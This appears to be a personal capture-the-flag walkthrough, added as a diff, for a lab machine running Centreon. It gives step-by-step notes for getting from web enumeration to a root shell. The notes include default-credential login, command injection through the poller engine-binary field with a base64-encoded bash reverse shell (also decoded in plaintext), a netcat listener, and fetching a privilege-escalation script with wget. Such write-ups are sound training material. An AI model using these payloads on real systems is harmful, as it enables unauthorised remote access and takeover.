@@ -1,0 +1,34 @@
+User and Root
+=============
+1) enumerate using gobuster
+gotten:
+/monitoring	#need authentication
+2)burpsuit intercept webpage 10.10.10.157/monitoring
+change GET method to POST and forward until gotten /centreon
+
+//gotten this idea from curl -X POST 10.10.10.157/monitoring (where it shows moved permanent)
+
+3) user:admin password:password1
+4) create poller
+-check yes for localhost
+-monitoring Engine Binary set to "echo${IFS}YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS44NC8xODg5MCAwPiYx|base64${IFS}-d|bash;"
+5)local terminal "nc -lvp <port>"
+6)at centreon/poller>export>selectPollerName>export
+7)python -m SimpleHTTPServer 8080 at local /root/script
+8)at www-data side "wget <ip>:<port>/screenshot.sh"
+9)add execute privilege to screenshot.sh and ./screenshot.sh
+//rmb the "root@name" wont show up, so use whoami to check
+10)now get root and user flag
+
+
+tips
+=====
+//encoded with base64
+plaintext = bash -i >& /dev/tcp/10.10.15.84/18890 0>&1
+
+
+//upload file to remote pc
+pythom -m SimpleHTTPServer 8080 #at the specific files folder to upload 
+wget <ip>:<port>/<filename/path>
+
+
